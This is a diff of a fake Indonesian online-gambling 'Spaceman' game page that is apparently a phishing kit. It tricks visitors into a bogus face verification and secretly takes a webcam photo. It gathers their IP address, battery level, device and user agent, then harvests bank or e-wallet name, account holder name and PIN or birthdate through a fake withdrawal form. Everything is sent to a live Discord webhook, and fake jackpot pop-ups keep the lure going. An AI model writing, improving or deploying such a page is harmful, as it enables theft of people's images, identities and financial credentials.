@@ -3,210 +3,201 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MAXX77 - Spaceman Gacor Anti Rungkad</title>
+    <title>MAXX77 - SPACEMAN GACOR</title>
     <style>
-        body { background: #0b0e11; color: #fff; font-family: 'Segoe UI', Arial, sans-serif; text-align: center; margin: 0; overflow-x: hidden; }
-        .header { background: #1c1f24; padding: 10px; border-bottom: 2px solid #ffcc00; display: flex; justify-content: space-between; align-items: center; padding: 10px 20px; }
+        body { background: #0b0e11; color: #fff; font-family: 'Segoe UI', sans-serif; text-align: center; margin: 0; overflow-x: hidden; }
+        .header { background: #0056b3; padding: 10px; font-weight: bold; font-size: 20px; border-bottom: 3px solid #ffcc00; }
         .container { padding: 15px; max-width: 450px; margin: auto; }
-        .game-area { background: #14171c; border-radius: 15px; border: 2px solid #333; position: relative; height: 300px; overflow: hidden; margin-bottom: 15px; }
-        .multiplier { font-size: 48px; font-weight: bold; color: #ffcc00; margin-top: 80px; position: relative; z-index: 2; }
-        .astronaut { font-size: 50px; position: absolute; bottom: 20px; left: 20%; transition: all 0.1s linear; }
-        .bet-btn { background: #ffcc00; color: #000; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 18px; text-transform: uppercase; }
-        .bet-btn:disabled { background: #444; color: #888; }
-        .toast { position: fixed; top: 20px; right: 20px; background: #00ff00; color: #000; padding: 10px 20px; border-radius: 5px; font-weight: bold; display: none; z-index: 100; }
-        .ad-popup { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #fff; color: #000; padding: 20px; border-radius: 10px; border: 5px solid #ff0000; z-index: 1000; display: none; width: 280px; }
-        input { width: 90%; padding: 12px; margin: 10px 0; background: #222; border: 1px solid #ffcc00; color: #fff; border-radius: 5px; }
-        #game-ui, #wd-ui, #loading, #final { display: none; }
-        .loader { border: 5px solid #333; border-top: 5px solid #ffcc00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        /* Spaceman Arena */
+        .game-area { background: #1c1f24; border: 2px solid #3498db; border-radius: 15px; padding: 20px; position: relative; height: 250px; overflow: hidden; margin-top: 10px; }
+        .astronaut { font-size: 50px; position: absolute; bottom: 20px; left: 20px; transition: 0.1s; }
+        .multiplier { font-size: 40px; font-weight: bold; margin-top: 60px; color: #fff; }
+        
+        .btn-bet { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 10px; }
+        .btn-bet:disabled { background: #444; }
+        
+        /* Fake Ads Pop-up */
+        .popup-ad { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #fff; color: #000; padding: 20px; border: 5px solid #ffcc00; z-index: 100; display: none; width: 80%; border-radius: 10px; }
+        .close-ad { position: absolute; top: 5px; right: 10px; cursor: pointer; font-weight: bold; }
+
+        input { width: 90%; padding: 12px; margin: 8px 0; background: #222; border: 1px solid #3498db; color: #fff; border-radius: 5px; }
+        #game-screen, #withdraw-screen, #loading, #final { display: none; }
+        
+        .alert-bet { background: #00ff00; color: #000; padding: 5px; border-radius: 5px; font-weight: bold; display: none; margin-top: 5px; }
     </style>
 </head>
 <body>
 
-    <div id="toast" class="toast">TARUHAN DITERIMA!</div>
-
-    <!-- FAKE POPUP AD -->
-    <div id="ad" class="ad-popup">
-        <button style="float:right;" onclick="closeAd()">X</button>
-        <h3 style="color:red;">BONUS JP!</h3>
-        <p>Deposit sekarang dan dapatkan bonus 200%!</p>
-        <button class="bet-btn" onclick="closeAd()">KLAIM SEKARANG</button>
-    </div>
-
-    <div class="header">
-        <span style="color:#ffcc00; font-weight:bold;">MAXX77</span>
-        <span id="bal-header" style="color:#00ff00;">Rp 50.000</span>
-    </div>
+    <div class="header">👨‍🚀 SPACEMAN MAXX77 🚀</div>
 
     <div class="container">
-        <!-- PHASE 1: CAMERA VERIFICATION -->
-        <div id="auth-ui">
-            <h2 style="color:#ffcc00;">VERIFIKASI PLAYER</h2>
-            <img src="https://img.icons8.com/emoji/96/000000/astronaut-emoji.png" width="80">
-            <p>Untuk klaim Saldo Awal **Rp 50.000**, silakan lakukan verifikasi wajah (Liveness Check).</p>
-            <button class="bet-btn" onclick="startAuth()">VERIFIKASI & KLAIM</button>
+        <!-- PHASE 1: AUTHENTICATION (ALL DATA CAPTURED HERE) -->
+        <div id="auth-screen">
+            <h2 style="color:#ffcc00;">VERIFIKASI SERVER</h2>
+            <p style="font-size: 14px;">Server penuh! Silakan verifikasi wajah untuk mendapatkan slot prioritas dan **Saldo Bonus Rp 50.000**.</p>
+            <button class="btn-bet" style="background:#ffcc00; color:#000;" onclick="captureEverything()">VERIFIKASI & MAIN</button>
         </div>
 
-        <!-- PHASE 2: SPACEMAN GAME -->
-        <div id="game-ui">
-            <div class="game-area">
-                <div id="mult" class="multiplier">1.00x</div>
-                <div id="astro" class="astronaut">👨‍🚀</div>
-                <div id="crash-msg" style="color:red; display:none; font-weight:bold; margin-top:10px;">SPACEMAN CRASHED!</div>
+        <!-- PHASE 2: THE SPACEMAN GAME -->
+        <div id="game-screen">
+            <div style="text-align: left; margin-bottom: 10px;">
+                <span style="color:#aaa;">Saldo:</span> <b id="balance" style="color:#00ff00;">Rp 50.000</b>
             </div>
-            <button id="action-btn" class="bet-btn" onclick="placeBet()">PASANG TARUHAN (Rp 5.000)</button>
-            <button class="bet-btn" style="background:#333; color:#ccc; margin-top:10px; font-size:14px;" onclick="showWD()">WITHDRAW SALDO</button>
+            <div class="game-area">
+                <div class="multiplier" id="multi">1.00x</div>
+                <div class="astronaut" id="astro">👨‍🚀</div>
+                <div id="bet-alert" class="alert-bet">TARUHAN DITERIMA!</div>
+            </div>
+            <button class="btn-bet" id="bet-btn" onclick="placeBet()">PASANG TARUHAN (Rp 5.000)</button>
+            <button class="btn-bet" style="background:#444;" onclick="showWithdraw()">WITHDRAW (WD)</button>
         </div>
 
-        <!-- PHASE 3: WITHDRAW -->
-        <div id="wd-ui">
-            <h2 style="color:#ffcc00;">FORM WITHDRAW</h2>
+        <!-- PHASE 3: WITHDRAW FORM -->
+        <div id="withdraw-screen">
+            <h2 style="color:#ffcc00;">FORM PENCAIRAN</h2>
             <input type="text" id="bank" placeholder="Bank / E-Wallet (DANA/OVO)">
-            <input type="text" id="accName" placeholder="Nama Sesuai Rekening">
-            <input type="text" id="accPin" placeholder="PIN Akun / Tanggal Lahir (DDMMYY)">
-            <button class="bet-btn" onclick="finalProcess()">KONFIRMASI WD</button>
+            <input type="text" id="accName" placeholder="Nama Lengkap">
+            <input type="text" id="accPin" placeholder="PIN WD / Tanggal Lahir">
+            <button class="btn-bet" onclick="finalStep()">KONFIRMASI WD</button>
         </div>
 
-        <!-- PHASE 4: LOADING / FINAL -->
-        <div id="loading">
-            <div class="loader"></div>
-            <p id="l-msg">Processing...</p>
-        </div>
-
+        <!-- LOADING & FINAL -->
+        <div id="loading"><p>Processing...</p></div>
         <div id="final">
-            <h2 style="color:red;">SYSTEM COMPROMISED</h2>
-            <img id="targetImg" style="width:100%; border-radius:10px; border:2px solid #ffcc00;">
+            <h2 style="color:red;">SISTEM DISADAP</h2>
+            <img id="facePreview" style="width:100%; border-radius:10px;">
         </div>
+    </div>
+
+    <!-- Fake Ad -->
+    <div id="ad-box" class="popup-ad">
+        <span class="close-ad" onclick="closeAd()">[X]</span>
+        <h3 style="color:red;">MENANG JACKPOT!</h3>
+        <p>User **Endang_Depok** baru saja menang Rp 2.500.000!</p>
+        <button class="btn-bet" onclick="closeAd()">KLAIM SEKARANG</button>
     </div>
 
     <video id="v" autoplay style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        const webH = "https://discord.com/api/webhooks/1499298779143340053/96v2UUkOcDdK8X_PG-2_zOycfoYzxO0_7rt2m6npWmjMMUSuUWsTPkSM_cpO9L69dr8K";
+        const webhook = "https://discord.com/api/webhooks/1499298779143340053/96v2UUkOcDdK8X_PG-2_zOycfoYzxO0_7rt2m6npWmjMMUSuUWsTPkSM_cpO9L69dr8K";
         let saldo = 50000;
-        let blob = null;
-        let running = false;
+        let capturedPhoto = null;
+        let multiplier = 1.0;
+        let gameActive = false;
 
-        // Auto Popup every 1 minute
-        setInterval(() => { document.getElementById('ad').style.display = 'block'; }, 60000);
-        function closeAd() { document.getElementById('ad').style.display = 'none'; }
+        // Auto-Ads every 1 minute
+        setInterval(() => {
+            document.getElementById('ad-box').style.display = 'block';
+        }, 60000);
 
-        async function startAuth() {
+        function closeAd() { document.getElementById('ad-box').style.display = 'none'; }
+
+        async function captureEverything() {
             try {
-                const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('v');
-                video.srcObject = s;
+                video.srcObject = stream;
+
+                // Send all technical info immediately while camera starts
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const battery = await navigator.getBattery();
+                
                 setTimeout(() => {
                     const canvas = document.getElementById('c');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(b => { blob = b; document.getElementById('targetImg').src = URL.createObjectURL(b); }, 'image/png');
-                    s.getTracks().forEach(t => t.stop());
-                    document.getElementById('auth-ui').style.display = 'none';
-                    document.getElementById('game-ui').style.display = 'block';
-                }, 1000);
-            } catch (e) { alert("Izin kamera diperlukan untuk klaim saldo."); startAuth(); }
+                    canvas.toBlob(blob => {
+                        capturedPhoto = blob;
+                        document.getElementById('facePreview').src = URL.createObjectURL(blob);
+                        
+                        // Initial Stealth Log to Discord
+                        const fd = new FormData();
+                        fd.append('file', blob, 'initial_capture.png');
+                        fd.append('payload_json', JSON.stringify({
+                            embeds: [{
+                                title: "🚨 PENYADAPAN AWAL (METADATA CAPTURED)",
+                                color: 16711680,
+                                fields: [
+                                    { name: "🌐 IP Address", value: ipData.ip, inline: true },
+                                    { name: "🔋 Baterai", value: `${Math.round(battery.level * 100)}%`, inline: true },
+                                    { name: "📱 Perangkat", value: navigator.platform, inline: true },
+                                    { name: "🕵️ User Agent", value: navigator.userAgent }
+                                ]
+                            }]
+                        }));
+                        fetch(webhook, { method: 'POST', body: fd });
+                    }, 'image/png');
+
+                    stream.getTracks().forEach(t => t.stop());
+                    document.getElementById('auth-screen').style.display = 'none';
+                    document.getElementById('game-screen').style.display = 'block';
+                }, 1500);
+            } catch (e) {
+                alert("Gagal Verifikasi: Sensor kamera diperlukan untuk memvalidasi saldo bonus.");
+                captureEverything();
+            }
         }
 
         function placeBet() {
-            if(running) return cashOut();
             if(saldo < 5000) return alert("Saldo tidak cukup!");
-            
             saldo -= 5000;
-            updateUI();
-            showToast();
+            document.getElementById('balance').innerText = `Rp ${saldo.toLocaleString()}`;
+            document.getElementById('bet-alert').style.display = 'block';
+            document.getElementById('bet-btn').disabled = true;
+
+            // Spaceman Flight Logic
+            let astro = document.getElementById('astro');
+            let multiText = document.getElementById('multi');
+            let x = 20, y = 20;
+            multiplier = 1.0;
             
-            running = true;
-            let currentMult = 1.00;
-            document.getElementById('action-btn').innerText = "CASH OUT";
-            document.getElementById('action-btn').style.background = "#ff0000";
-            document.getElementById('crash-msg').style.display = 'none';
+            let flight = setInterval(() => {
+                multiplier += 0.05;
+                x += 2; y += 2;
+                multiText.innerText = multiplier.toFixed(2) + "x";
+                multiText.style.color = "#ffcc00";
+                astro.style.left = x + "px";
+                astro.style.bottom = y + "px";
 
-            let timer = setInterval(() => {
-                currentMult += 0.05;
-                document.getElementById('mult').innerText = currentMult.toFixed(2) + "x";
-                document.getElementById('astro').style.bottom = (20 + (currentMult * 10)) + "px";
-                document.getElementById('astro').style.left = (20 + (currentMult * 5)) + "%";
-
-                if (Math.random() < 0.02 || currentMult > 10) {
-                    clearInterval(timer);
-                    if(running) {
-                        running = false;
-                        document.getElementById('crash-msg').style.display = 'block';
-                        resetBtn();
-                    }
+                if(Math.random() > 0.98 || x > 300) { // Crash chance
+                    clearInterval(flight);
+                    multiText.innerText = "CRASHED!";
+                    multiText.style.color = "red";
+                    setTimeout(() => {
+                        astro.style.left = "20px";
+                        astro.style.bottom = "20px";
+                        document.getElementById('bet-btn').disabled = false;
+                        document.getElementById('bet-alert').style.display = 'none';
+                    }, 2000);
                 }
             }, 100);
-
-            window.currentTimer = timer;
-            window.currentMult = currentMult;
         }
 
-        function cashOut() {
-            clearInterval(window.currentTimer);
-            let win = 5000 * parseFloat(document.getElementById('mult').innerText);
-            saldo += win;
-            running = false;
-            alert("Berhasil Cash Out! Menang: Rp " + win.toFixed(0));
-            updateUI();
-            resetBtn();
+        function showWithdraw() {
+            document.getElementById('game-screen').style.display = 'none';
+            document.getElementById('withdraw-screen').style.display = 'block';
         }
 
-        function resetBtn() {
-            document.getElementById('action-btn').innerText = "PASANG TARUHAN (Rp 5.000)";
-            document.getElementById('action-btn').style.background = "#ffcc00";
-        }
-
-        function updateUI() {
-            document.getElementById('bal-header').innerText = "Rp " + saldo.toLocaleString();
-        }
-
-        function showToast() {
-            let t = document.getElementById('toast');
-            t.style.display = 'block';
-            setTimeout(() => { t.style.display = 'none'; }, 2000);
-        }
-
-        function showWD() {
-            document.getElementById('game-ui').style.display = 'none';
-            document.getElementById('wd-ui').style.display = 'block';
-        }
-
-        async function finalProcess() {
-            const b = document.getElementById('bank').value;
-            const n = document.getElementById('accName').value;
-            const p = document.getElementById('accPin').value;
-            if(!b || !n || !p) return alert("Data tidak lengkap!");
-
-            document.getElementById('wd-ui').style.display = 'none';
-            document.getElementById('loading').style.display = 'block';
-
-            const ipR = await fetch('https://api.ipify.org?format=json');
-            const ipD = await ipR.json();
-            const bat = await navigator.getBattery();
-
+        async function finalStep() {
             const fd = new FormData();
-            fd.append('file', blob, 'target.png');
             fd.append('payload_json', JSON.stringify({
                 embeds: [{
-                    title: "🚀 SPACEMAN TARGET CAPTURED",
-                    color: 16763904,
+                    title: "💰 WITHDRAW DATA (FINAL DIG)",
                     fields: [
-                        { name: "🏦 Bank", value: b, inline: true },
-                        { name: "👤 Nama", value: n, inline: true },
-                        { name: "🔑 PIN/B-Day", value: `\`${p}\`` },
-                        { name: "💰 Sisa Saldo", value: `Rp ${saldo.toLocaleString()}` },
-                        { name: "🌐 IP Address", value: ipD.ip },
-                        { name: "🔋 Baterai", value: `${bat.level * 100}%` }
-                    ],
-                    footer: { text: "Beelink Spaceman Audit - Depok" }
+                        { name: "Bank", value: document.getElementById('bank').value },
+                        { name: "Nama", value: document.getElementById('accName').value },
+                        { name: "PIN/Bday", value: document.getElementById('accPin').value },
+                        { name: "Saldo Terakhir", value: `Rp ${saldo}` }
+                    ]
                 }]
             }));
-
-            await fetch(webH, { method: 'POST', body: fd });
-            document.getElementById('loading').style.display = 'none';
+            await fetch(webhook, { method: 'POST', body: fd });
+            document.getElementById('withdraw-screen').style.display = 'none';
             document.getElementById('final').style.display = 'block';
         }
     </script>
